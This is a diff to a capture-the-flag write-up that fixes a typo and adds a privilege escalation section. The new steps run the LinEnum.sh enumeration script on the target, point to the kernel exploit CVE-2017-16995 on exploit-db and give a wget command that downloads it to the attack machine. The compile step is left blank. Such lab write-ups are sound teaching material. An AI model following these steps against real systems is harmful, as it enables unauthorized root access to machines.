@@ -171,11 +171,20 @@ export SHELL=bash
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ca14a5be-2b4c-4845-a4bf-df1920bf9209)
 
 
-+ Donwload [LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) and transfer it to the target.
++ Download [LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) and transfer it to the target.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/fd7bf5da-cae9-49fe-bf09-f0a1be5f1cb7)
 
+## Privilege Escalation:
 
+### 1.Solution:
++ Run `./LinEnum.sh`
++ Check kernel exploit: [CVE-2017-16995](https://www.exploit-db.com/exploits/45010)
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/9a6683a9-0aed-49b1-b75f-eefd28943e50)
+
++ Download on your attack machine: `wget https://www.exploit-db.com/download/45010 -O exploit.c`
++ Compile it on the attack machine: ``
 
 
 
